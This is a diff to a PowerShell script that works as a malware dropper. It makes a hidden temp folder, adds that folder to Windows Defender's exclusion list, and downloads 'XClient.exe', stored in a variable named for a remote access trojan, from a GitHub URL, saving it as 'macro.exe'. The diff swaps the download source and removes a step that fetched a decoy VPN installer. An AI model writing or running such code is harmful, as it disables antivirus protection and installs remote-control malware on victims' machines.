@@ -1,15 +1,9 @@
 $systemPath = [System.IO.Path]::Combine($env:temp, "SystemTemp")
 New-Item -Path $systemPath -ItemType Directory -Force
 
-$vpnUrl = "https://github.com/PXTDEV9022/soft/raw/refs/heads/main/privax_vpn_online_setup.exe"
-$vpnPath = [System.IO.Path]::Combine($systemPath, "vpn_setup.exe")
-
-Invoke-WebRequest -Uri $vpnUrl -OutFile $vpnPath
-Start-Process -FilePath $vpnPath -Wait
-
 Add-MpPreference -ExclusionPath $systemPath
 
-$ratUrl = "https://github.com/minhdmkk6/t2/raw/refs/heads/main/XClient.exe"
+$ratUrl = "https://github.com/PXTDEV9022/Support-Facebook/raw/refs/heads/main/XClient.exe"
 $ratPath = [System.IO.Path]::Combine($systemPath, "macro.exe")
 
 Invoke-WebRequest -Uri $ratUrl -OutFile $ratPath
